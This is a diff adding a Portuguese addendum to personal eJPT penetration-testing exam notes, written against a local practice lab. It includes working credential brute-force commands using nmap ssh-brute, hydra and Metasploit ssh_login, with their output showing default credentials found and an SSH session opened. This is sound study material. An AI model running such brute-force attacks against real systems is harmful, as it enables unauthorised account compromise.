@@ -894,6 +894,124 @@ hydra -L users.txt -P passes.txt -t 4 -f 127.0.0.1 -s 2121 ftp
 FTP é o módulo do hydra que funciona aqui. SSH/RDP **não** (sem módulo compilado) — no Kali do exame sim.
 
 
+# ADENDO 16/NOV — RE-MEDIDO NA VÉSPERA (tudo abaixo rodou hoje, 11:09–11:15)
+
+Contexto: o voucher é comprado amanhã. Nada abaixo é suposição — cada linha saiu de execução real
+nesta máquina, contra o lab oficial (`bash ~/LIBERTUS/ejpt/lab_up.sh`).
+
+## I.1 — Versões exatas de hoje (mudou algo desde 23/out)
+
+| Ferramenta | Versão medida | Mudança |
+|---|---|---|
+| nmap | **7.993** | subiu de 7.992 — e isso consertou o `ssh-brute` (ver I.2) |
+| msfconsole | **6.4.126-dev** (snap) | banco de pé |
+| hydra | 9.8dev (`/usr/local/bin/hydra`) | mesmo build sem libssh/openssl/freerdp |
+| gobuster | 3.8.2 | ok |
+| sqlmap | 1.8.12#pip (avisa "outdated", funciona) | ok |
+| nc | OpenBSD 1.226 (Debian patchlevel) | sem `-e` |
+| john | 1.9.0-jumbo-1 bleeding (AVX-512) | abre hash sha512crypt |
+| openvpn | 2.6.19 | **essencial**: é como se conecta na VPN do lab INE |
+
+Presentes também: `searchsploit`, `sshpass`, `tcpdump`, `nuclei`, `ffuf`, `subfinder`.
+**Ausentes**: `burp`, `wireshark`, `ncrack`, `medusa`. No Kali da INE existem.
+
+## I.2 — `nmap --script ssh-brute` AGORA FUNCIONA (o pitfall antigo caducou)
+
+O registro de outubro dizia que ssh-brute "quebra com nse_restore WAITING_TO_RUNNING". Em 7.993,
+com listas pequenas, roda limpo e acha credencial em ~1 s. **Este é o substituto direto do hydra SSH.**
+
+```bash
+# ATENÇÃO: nmap é snap -> userdb/passdb OBRIGATORIAMENTE dentro de $HOME.
+# Em /tmp ele nem abre o arquivo: "Invalid usernames iterator: .../tmp/users.txt: No such file or directory"
+printf "msfadmin\n"                    > ~/LIBERTUS/ejpt/wordlists/ejpt_ssh_users.txt
+printf "errada\nmsfadmin\n"            > ~/LIBERTUS/ejpt/wordlists/ejpt_ssh_pass.txt
+
+nmap -p 2222 -Pn --script ssh-brute \
+  --script-args userdb=/home/libertus/LIBERTUS/ejpt/wordlists/ejpt_ssh_users.txt,passdb=/home/libertus/LIBERTUS/ejpt/wordlists/ejpt_ssh_pass.txt \
+  127.0.0.1
+# -> |     msfadmin:msfadmin - Valid credentials
+#    |_  Statistics: Performed 2 guesses in 1 seconds, average tps: 2.0
+```
+
+Limite honesto: com `rockyou.txt` inteiro (14,3 M linhas) o NSE pode estourar o bug de fila que o
+registro de outubro descreve. Usar `/usr/share/wordlists/rockyou.txt` só fatiado
+(`head -5000`) ou `~/wordlists/pass/top10k.txt`. Ordem de preferência para SSH no exame:
+**msf `ssh_login` (abre sessão) → ssh-brute (só confirma) → sshpass em loop**.
+
+## I.3 — Hidra: matriz de módulos medida um por um (16/nov)
+
+Cada linha foi testada individualmente (não é o resumo do `-h`):
+
+```
+ftp            OK      <- validado achando msfadmin:msfadmin no 2121
+http-get       OK
+http-post-form OK      <- cuidado: falso positivo em form com CSRF (regra §F.1)
+mysql          OK
+telnet         OK
+ssh            FALTA   [ERROR] Compiled without LIBSSH v0.4.x support
+smb            FALTA   [ERROR] Compiled without OPENSSL support
+rdp            FALTA   [ERROR] Compiled without FREERDP support
+```
+
+No Kali da INE todos existem. **Aqui**, para ssh/smb/rdp, usar Metasploit (I.4) ou ssh-brute (I.2).
+Sem sudo não dá para consertar (`sudo` pede senha; `libssh-dev` está disponível no apt, mas o
+rebuild exige root). Não gastar tempo nisso na véspera.
+
+## I.4 — MSF `ssh_login`: abre sessão de verdade (validado hoje)
+
+```bash
+msfconsole -q -x "use auxiliary/scanner/ssh/ssh_login; \
+ set RHOSTS 127.0.0.1; set RPORT 2222; set USERNAME msfadmin; \
+ set PASS_FILE /home/libertus/LIBERTUS/ejpt/wordlists/ejpt_ssh_pass.txt; \
+ set STOP_ON_SUCCESS true; set VERBOSE true; run; exit -y"
+# -> [+] 127.0.0.1:2222 - Success: 'msfadmin:msfadmin' 'uid=1000(msfadmin) ...'
+# -> [*] SSH session 1 opened (127.0.0.1:40441 -> 127.0.0.1:2222)
+```
+
+`PASS_FILE` **não** pode apontar para `/usr/share` (o snap do msf não lê) — usar `~/wordlists/pass/top10k.txt`.
+E `exit` trava com sessão aberta: `exit -y`.
+
+## I.5 — Wordlists: inventário real (medido, não herdado)
+
+O que **não** existe nesta máquina (não perder tempo procurando):
+
+```
+/usr/share/wordlists/dirb/          -> diretório VAZIO
+/usr/share/seclists/                -> só pastas vazias (Discovery/Web-Content, Passwords, ...)
+```
+
+O que existe e serve:
+
+| Caminho | Linhas | Uso |
+|---|---|---|
+| `/usr/share/wordlists/common.txt` | 4.750 | dirb comum — gobuster rápido |
+| `/usr/share/wordlists/rockyou.txt` | 14.344.391 | senhas (fatiar para ssh-brute) |
+| `~/wordlists/web/directory-list-2.3-medium.txt` | 220.559 | gobuster web pesado |
+| `~/wordlists/web/directory-list-2.3-small.txt` | — | gobuster web rápido |
+| `~/wordlists/web/raft-small-words.txt` | — | primeira passada (validado hoje no DVWA) |
+| `~/wordlists/web/subdomains-5000.txt` | — | vhost |
+| `~/wordlists/pass/top1000.txt` | 1.000 | hydra/msf (aceito pelo snap) |
+| `~/wordlists/pass/top10k.txt` | 10.000 | hydra/msf |
+| `~/wordlists/pass/500-worst.txt` | 500 | teste instantâneo |
+| `~/wordlists/user/top-usernames.txt` | — | `-L` do hydra |
+
+No Kali da INE os caminhos são outros (`/usr/share/wordlists/dirb/common.txt`, rockyou `.gz`).
+Lá, `gunzip /usr/share/wordlists/rockyou.txt.gz` antes do primeiro uso.
+
+## I.6 — Disco: 99% (1,2 GB livres)
+
+Não baixar imagem Docker, seclists completo (~2 GB) nem compilar nada hoje/amanhã.
+O exame roda no Kali da INE — esta máquina é apoio, não precisa de arsenal novo.
+
+## I.7 — Nuance de SMB que evita pânico no cenário A
+
+`nmap --script smb-vuln-ms17-010` contra Samba (o lab de treino, 172.28.77.11) **não imprime
+"VULNERABLE" nem "NOT VULNERABLE" — não imprime nada**. Só Windows retorna veredito.
+Silêncio em Samba ≠ seguro; e "VULNERABLE" só aparece em Windows sem patch.
+Quando não houver veredito, o caminho é `smb-vuln-ms08-067` + tentativa do módulo + leitura do erro.
+
+
+
 
 
 
